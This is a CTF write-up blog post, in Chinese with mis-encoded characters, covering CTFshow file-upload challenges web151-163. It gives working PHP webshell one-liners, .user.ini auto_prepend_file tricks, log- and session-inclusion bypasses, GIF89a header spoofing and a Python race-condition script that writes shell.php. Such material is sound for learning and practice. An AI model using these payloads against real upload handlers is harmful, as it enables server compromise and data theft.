---
title: CTFshow æ–‡ä»¶ä¸Šä¼ web151-170
date: 2024-07-30 14:52:41
permalink: /pages/06f28c/
categories:
  - wp
tags:
  - æ–‡ä»¶ä¸Šä¼ 
author: 
  name: ajay
  link: https://the0n3.top
---
# CTFshow æ–‡ä»¶ä¸Šä¼ web151-170

åœ¨linuxæœåŠ¡å™¨ç±»å‹çš„æ–‡ä»¶ä¸Šä¼ ï¼Œå¤§å¤šè€ƒå¯Ÿå‰ç«¯éªŒè¯æ–‡ä»¶ç±»å‹ï¼Œåç«¯éªŒè¯content-typeã€æ–‡ä»¶åã€æ‰©å±•åã€æ–‡ä»¶å¤´ã€æ–‡ä»¶å†…å®¹ç­‰

## web 151  å‰ç«¯éªŒè¯

f12çœ‹æºç jsï¼Œæ²¡æœ‰å­¦è¿‡jså¤§æ¦‚ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªåŠŸèƒ½ï¼Œåªå…è®¸pngä¸Šä¼ 

![png](https://the0n3.top/medias/show-upload/1.png)

å‰ç«¯jsé˜²å›å­ä¸é˜²å°äºº(ğŸ˜€)ï¼ŒæŠŠpngä¿®æ”¹ä¸ºphpï¼Œæˆ–è€…æ·»åŠ phpéƒ½å¯ä»¥

![php](https://the0n3.top/medias/show-upload/2.png)

```
lay-data="{url: 'upload.php', accept: 'images',exts:'png|php'}
```

ä¿®æ”¹åå°±å¯ä»¥ä¸Šä¼ æœ¨é©¬äº†

## web 152 éªŒè¯content-type

f12çœ‹æºç ï¼Œåƒä¸Šé¢˜ä¸€æ ·åšã€‚ä¼šæŠ¥é”™ç±»å‹é”™è¯¯

![f12](https://the0n3.top/medias/show-upload/3.png)

é‚£ä¹ˆåº”è¯¥æ˜¯postæŠ¥æ–‡é‡Œçš„content-typeè¢«æ£€æµ‹åˆ°äº†ï¼Œç”¨bpæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹ï¼Œä¿®æ”¹ä¸ºå…è®¸çš„pngå›¾ç‰‡çš„content-typeç±»å‹

![post](https://the0n3.top/medias/show-upload/4.png)

æŠŠ1.pngæœ¨é©¬åæ”¹å›1.phpï¼Œcontent-typeä¿®æ”¹ä¸ºimage/pngå°±å¯ä»¥ä¸Šä¼ äº†

## web 153 

è¿™æ¬¡åç«¯éªŒè¯æ–‡ä»¶åï¼Œåªèƒ½ä¸Šä¼ pngå›¾ç‰‡é©¬äº†ï¼Œåˆ©ç”¨.user.inié…ç½®æ–‡ä»¶æ¥åŒ…å«å›¾ç‰‡é©¬
å‡†å¤‡ä¸€ä¸ªé©¬1.phpï¼Œä¿®æ”¹ä¸ºpngåç¼€ï¼Œç›´æ¥ä¸Šä¼ 1.png

å‡†å¤‡ä¸€ä¸ª.user.pngæ–‡ä»¶ï¼Œç”¨bpä¿®æ”¹ä¸ºåŸæ¥çš„.user.iniåå­—ï¼Œ.user.iniå†…å®¹

![ini](https://the0n3.top/medias/show-upload/5.png)

å†™ä¸€ä¸ªé…ç½®é¡¹å³å¯
```ini
# åœ¨æ‰€æœ‰é¡µé¢åŠ è½½å‰ï¼Œè‡ªåŠ¨åŒ…å«æŒ‡å®šæ–‡ä»¶ï¼Œæ–‡ä»¶å†…çš„phpä»£ç ä¼šæ­£å¸¸æ‰§è¡Œ
auto_prepend_file=1.png
# åœ¨æ–‡ä»¶åŠ è½½ååŒ…å«
auto_append_file=1.png
```

æç¤ºæˆåŠŸä¸Šä¼ åˆ°/upload/ç›®å½•ä¸‹ï¼Œåˆ°uploadç›®å½•ä¸‹æˆåŠŸè§£æä¸ºphpæœ¨é©¬

![upload](https://the0n3.top/medias/show-upload/6.png)

## web 154 æ–‡ä»¶å†…å®¹éªŒè¯

æ­£å¸¸ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæç¤ºå†…å®¹ä¸åˆè§„

![upload](https://the0n3.top/medias/show-upload/7.png)

(ç¨åŠ æ€ç´¢.png)ï¼Œå¤§æ¦‚æ˜¯æ–‡ä»¶å†…å®¹å¼€å¤´çš„<?phpè¢«æ£€æµ‹åˆ°äº†ï¼Œç¨åŠ ä¿®æ”¹

```php
<?=highlight_file(__FILE__);eval($_GET[1]);?>
```

ä¸Šä¼ æˆåŠŸã€‚é‚£ä¹ˆå†è¯•è¯•ä¸Šä¸€é¢˜çš„.user.iniè¿˜èƒ½ä¸èƒ½ç”¨ï¼Œä¸Šä¼ .user.pngï¼Œbpä¿®æ”¹ä¸º.user.iniï¼ŒæˆåŠŸä¸Šä¼ å¹¶è§£æphpä»£ç 

![=](https://the0n3.top/medias/show-upload/8.png)

## web 155 å†…å®¹æ£€æµ‹

æ­£å¸¸ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸å¯¹ï¼Ÿï¼Ÿç”¨ä¸Šé¢˜çš„æ–¹æ³•å¯ä»¥æ­£å¸¸åšå‡ºæ¥ã€‚

å¥½å¥‡ã€‚ç”¨ä¸Šé¢˜çš„æ–¹æ³•æŒ‚é©¬åæŸ¥çœ‹ä¸€ä¸‹è¿™é¢˜çš„æºç ï¼ŒçœŸçš„è¿˜æ˜¯æ£€æµ‹æ–‡ä»¶å†…å®¹

```php
if($_FILES['file']['type'] == 'image/png'){
            $arr = pathinfo($filename);
            $ext_suffix = $arr['extension'];
            if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
            }
    		
    	}else{
    		$ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
    	}
```

## web 156 å†…å®¹æ£€æµ‹

è¿™æ¬¡è¿˜æ˜¯å†…å®¹æ£€æµ‹ã€‚è¿‡æ»¤äº†'php'å­—ç¬¦ä¸²,'[]'ä¸­æ‹¬å·ç­‰ã€‚å­¦åˆ°äº†æ–°æ–¹æ³•ã€‚åŸæ¥è¿˜èƒ½ç”¨èŠ±æ‹¬å·

![èŠ±èŠ±](https://the0n3.top/medias/show-upload/9.png)

```php
<?=eval($_GET{1});?>
```

![èŠ±èŠ±](https://the0n3.top/medias/show-upload/10.png)

åˆgetåˆ°äº†

## web 157 å†…å®¹æ£€æµ‹

è¿™é¢˜åˆè¿‡æ»¤äº†{}èŠ±æ‹¬å·ï¼Œåˆ†å·ï¼Œ'log'ã€‚æ€è·¯è¿˜å’Œä¸Šé¢ä¸€æ ·ï¼Œä¸è¿‡å˜æˆäº†RCEç±»å‹çš„é¢˜ç›®äº†

è¿˜æ˜¯æ­£å¸¸ä¸Šä¼ .user.pngæ–‡ä»¶ï¼ŒbpæŠ“åŒ…æŠŠæ–‡ä»¶åæ”¹æˆ.user.iniã€‚æ¥ç€å¤„ç†å›¾ç‰‡é©¬

```php
<?=`ls /var/www/html`?>
```

ç°åœ¨ç›´æ¥ä½¿ç”¨åå¼•å·æ‰§è¡Œå‘½ä»¤ï¼Œæ²¡æœ‰åˆ†å·ç”¨?>å¼ºåˆ¶é—­åˆ

![ls](https://the0n3.top/medias/show-upload/11.png)

æ¯ä¸ªé©¬æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè¿‡æ»¤äº†'php'ï¼Œç”¨ç»Ÿé…ç¬¦å¤„ç†

```php
<?=`tac /var/www/html/f*`?>
```

![tac](https://the0n3.top/medias/show-upload/12.png)

## web 158 å†…å®¹æ£€æµ‹

åŒä¸Š

```php
preg_match('/php|\{|\[|\;|log/i', $str);
```

æ£€æŸ¥upload.phpæºç å‘ç°è¿‡æ»¤æ–°å¢äº†logï¼Œé‚£ä¹ˆä¸Šä¸€é¢˜é¢˜åº”è¯¥è€ƒå¯Ÿæ—¥å¿—åŒ…å«äº†ï¼Œæˆ–è®¸è¿™é¢˜è€ƒå¯Ÿçš„æ‰æ˜¯åå¼•å·å‘½ä»¤æ‰§è¡Œï¼Ÿ

<?=include'/var/log/nginx/access.log'?>

æˆ‘å›å»è¯•è¯•ï¼Œç­‰æˆ‘

æµ‹è¯•æˆåŠŸï¼Œçœ‹æ¥web157è€ƒå¯Ÿçš„çœŸæ˜¯æ—¥å¿—åŒ…å«ï¼Œä¸è¿‡æ—¢ç„¶includeç»“æ„å’Œå‡½æ•°éƒ½èƒ½ç”¨ï¼Œé‚£ä¹ˆsessionåŒ…å«åº”è¯¥ä¹Ÿæ˜¯è¡ŒåŠ¨é€šçš„ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è¯•è¯•

![log](https://the0n3.top/medias/show-upload/13.png)

:::warning
å¾€ååšäº†å‡ é¢˜åçŒ›å›å¤´ï¼Œæ—¢ç„¶.user.iniä¸­çš„**auto_prepend_file**é…ç½®é¡¹åŠŸèƒ½å°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆå¤šæ¬¡ä¸€ä¸¾å†ç”¨ä¸€ä¸ª1.pngçš„å›¾ç‰‡é©¬æ¥å®ç°æ–‡ä»¶åŒ…å«ï¼Œæ—¥å¿—åŒ…å«ï¼ŒsessionåŒ…å«å‘¢ï¼Ÿä¸å¤ªè¡Œï¼Œiniæ–‡ä»¶ä¸èƒ½æ‹¼æ¥æ²¡æœ‰phpç©æ³•å¤šï¼Œç¦ç”¨'log'ç›´æ¥gï¼Œæˆ‘ä»¬æ˜¯èªæ˜å®è´ä¸ä¸Šå½“(æŸ´éƒ¡çŒ«çŒ«)
:::


## web 159 å†…å®¹æ£€æµ‹

è¿˜æ˜¯å¯ä»¥ä¸Šé¢ç”¨åå¼•å·å‘½ä»¤æ‰§è¡Œé©¬çš„ç©æ³•ï¼Œè¿›è¡Œä¸Šä¼ æµ‹è¯•ï¼ŒæˆåŠŸã€‚

```php
<?=`tac /var/www/html/f*`?>
```

éƒ¨åˆ†æºç 

```php
preg_match('/php|\{|\[|\;|log|\(/i', $str);
```


çœ‹upload.phpæºç ï¼Œè¿™å›è¿‡æ»¤äº†è‹±æ–‡åŠè§’æ‹¬å·ï¼Œç¦ç”¨å‡½æ•°äº†ï¼Œä¸è¿‡includeè¯­æ³•ç»“æ„è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œlogè¿‡æ»¤äº†ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è¯•è¯•sessionåŒ…å«ï¼Œéœ€è¦æ¡ä»¶ç«äº‰

```php
<?=include'/tmp/sess_sessionID'>
```

## web 160 å†…å®¹æ£€æµ‹

åå¼•å·æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•è¡Œä¸é€šäº†ï¼Œå¤§æŠµè¢«banäº†ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„åšæ³•ï¼Œåˆå­¦åˆ°äº†ï¼Œæœ¬ä»¥ä¸ºç¦ç”¨'log'å°±ä¸èƒ½æ–‡ä»¶åŒ…å«äº†ï¼Œæ²¡æƒ³åˆ°å¸ˆå‚…ä»¬ç«Ÿç„¶æ‹¼æ¥æ¥å®ç°äº†

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

![log](https://the0n3.top/medias/show-upload/14.png)

æŸ¥çœ‹æºç ,è¿‡æ»¤äº†ç©ºæ ¼å’Œåå¼•å·

```php
preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
```

## web 161 æ£€æµ‹æ–‡ä»¶å¤´

è¿™é¢˜æ·»åŠ æ–°çš„é™åˆ¶ï¼šæ–‡ä»¶å¤´ï¼Œç»™ä¸Šé¢å›¾ç‰‡é©¬æ·»åŠ äº†ä¸€ä¸ªGIF89açš„æ–‡ä»¶å¤´ï¼Œä¸Šä¼ æˆåŠŸ
```php
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

.user.iniä¹Ÿè¦åŠ ä¸ŠGIF89aæ–‡ä»¶å¤´ï¼Œä¸Šä¼ æˆåŠŸ
![add](https://the0n3.top/medias/show-upload/15.png)

è®²è®²å…¶ä»–

è¿™é“é¢˜çš„éƒ¨åˆ†æºç 

```php
if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE && check($content) && getimagesize($_FILES["file"]["tmp_name"])){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
            }
```
åœ¨ç¬¬å››è¡Œå‡ºç°äº†getimagesizeï¼Œçœ‹å‡½æ•°åå°±å¯ä»¥çŸ¥é“æ˜¯æ£€æŸ¥å›¾ç‰‡æ–‡ä»¶å¤§å°ï¼Œå‡ºé¢˜äººç«Ÿç„¶ç”¨åœ¨è¿™é‡Œæ¥æ£€æŸ¥æ˜¯ä¸æ˜¯å›¾ç‰‡(æ¼)ï¼Œçœ‹åˆ°æ–‡ä»¶åæˆ‘è·³è¿‡å»äº†ï¼Œè¿˜ç–‘æƒ‘ä¸ºä»€ä¹ˆæ•´ä»½æºç æ²¡æœ‰æ£€æŸ¥æ–‡ä»¶å¤´çš„ä»£ç 

çœ‹çœ‹å®˜æ–¹æ–‡æ¡£[PHPå®˜æ–¹å¯¹è¯¥å‡½æ•°çš„è§£æ](https://www.php.net/manual/zh/function.getimagesize.php)

![getimagesize](https://the0n3.top/medias/show-upload/16.png)

## web 162 sessionåŒ…å«

å¯æ¶ï¼ç«Ÿç„¶è¿˜æ˜¯èº²ä¸æ‰ã€‚åˆ°äº†ç´§å¼ åˆºæ¿€çš„sessionåŒ…å«ï¼Œæˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡[sessionåŒ…å«](https://the0n3.top/pages/07a506/)

è¿™é¢˜æµ‹è¯•ä¸Šä¸€é¢˜çš„è§£æ³•è¡Œä¸é€šäº†ï¼Œåº”è¯¥æ˜¯æŠŠ.ä¹Ÿè¿‡æ»¤äº†ï¼Œç¦æ­¢é€šè¿‡æ‹¼æ¥æ¥ç»•è¿‡ï¼Œé‚£å°±è¯•è¯•sessionåŒ…å«

å›¾ç‰‡é©¬test.pngï¼Œä¸Šä¼ æ—¶bpæŠŠæ‰©å±•åå»æ‰
```php
GIF89a
<?=include"/tmp/sess_Cola"?>
```
![test](https://the0n3.top/medias/show-upload/18.png)

è¿™ä¸ªçƒ§é¢˜ï¼Œä¸å¸¦æ‰©å±•åçš„æ–‡ä»¶ä¹Ÿå¯ä»¥ä¸Šä¼ (æ¼)ï¼Œå¸¦GIF89aå¤´è¿‡getimagesizeå‡½æ•°ï¼Œé‚£ç©æ³•å°±å¤šäº†

```ini
GIF89a
auto_prepend_file=test
```

æŠŠ.user.iniä¼ ä¸Šå»

![ini](https://the0n3.top/medias/show-upload/17.png)

å‡†å¤‡æ¡ä»¶ç«äº‰è„šæœ¬
```python
import requests
import threading
import time

# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://c451c8da-a286-4835-a23a-bd6cd7e91f5a.challenge.ctf.show/upload/'
sessionid = 'Cola'
data = {
    # sessionæ–‡ä»¶å†…å®¹
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php phpinfo();?>");?>',
    # sessionæ–‡ä»¶è·¯å¾„å¯èƒ½ä¸åŒ
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# ä¸Šä¼ æ–‡ä»¶å‡½æ•°
def upload_file():
    while True:
        response = requests.post(url, data=data, files=file, cookies=cookies)
        time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²åˆ›å»º
def check_file():
    while True:
        r = requests.get(url + 'shell.php')
        if r.status_code == 200:
            print('Webshell created successfully')
            print(r.text)
            break
        else:
            print('errorï¼š', r.status_code)
        # time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹
threads = []
for _ in range(5):  # åˆ›å»º5ä¸ªä¸Šä¼ çº¿ç¨‹
    t = threading.Thread(target=upload_file)
    t.start()
    threads.append(t)

for _ in range(5):  # åˆ›å»º5ä¸ªæ£€æŸ¥çº¿ç¨‹
    t = threading.Thread(target=check_file)
    t.start()
    threads.append(t)

# ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ
for t in threads:
    t.join()

```
è„šæœ¬è·‘å®Œå°±å†™å…¥shell.phpäº†ï¼Œæœ¨é©¬å†…å®¹å¯ä»¥åœ¨è„šæœ¬é‡Œä¿®æ”¹
![shell](https://the0n3.top/medias/show-upload/19.png)

ä¾‹å¦‚ç›´æ¥æŸ¥çœ‹flagï¼Œæ³¨æ„è½¬ä¹‰
```
'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php system(\'tac /var/www/html/flag.php\');?>");?>',
```

![flag](https://the0n3.top/medias/show-upload/20.png)

è¿™é¢˜çœ‹åˆ«çš„å¸ˆå‚…æ˜¯ä½¿ç”¨vpsï¼ŒæŠŠipè½¬æˆå•ä¸ªæ•°å­—é¿å….çš„å‡ºç°æ¥åšçš„

## web 163  æ¡ä»¶ç«äº‰

è¿™é¢˜å¦‚æœä¸Šä¼ ä¸Šä¸€é¢˜çš„test.pngï¼Œä»¥åŠ.user.pngï¼Œå†å»æ‰test.pngçš„.pngï¼ŒæŠŠ.user.iniä¿®æ”¹ä¸º.user.iniæ—¶ï¼Œé¡µé¢ä¼šæç¤ºæ²¡æœ‰testè¿™ä¸ªæ–‡ä»¶ï¼Œæ— æ³•åŒ…å«

url/testï¼Œåˆ°äº†é¦–é¡µï¼Œurl/.user.iniä¼šä¸‹è½½.user.iniï¼Œè¯´æ˜.user.iniè¿˜åœ¨ï¼Œé‚£ä¹ˆå¯ä»¥çœç•¥æ‰test.pngè¿™ä¸€æ­¥ï¼Œè®©.user.iniç›´æ¥ç»™å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åŒ…å«sessionæ–‡ä»¶


```ini
GIF89a
auto_prepend_file=/tmp/sess_Cola
```

ä¸Šä¼ .user.iniåï¼Œå†æ¬¡ä½¿ç”¨ä¸Šé¢˜çš„è„šæœ¬ï¼Œå‘ç°è¿™æ¬¡è·‘äº†å¾ˆä¹…ï¼Œä¸è¿‡è¿˜å¥½ï¼Œè¿˜æ˜¯å‡ºæ¥äº†

## æŒç»­æ›´æ–°ä¸­......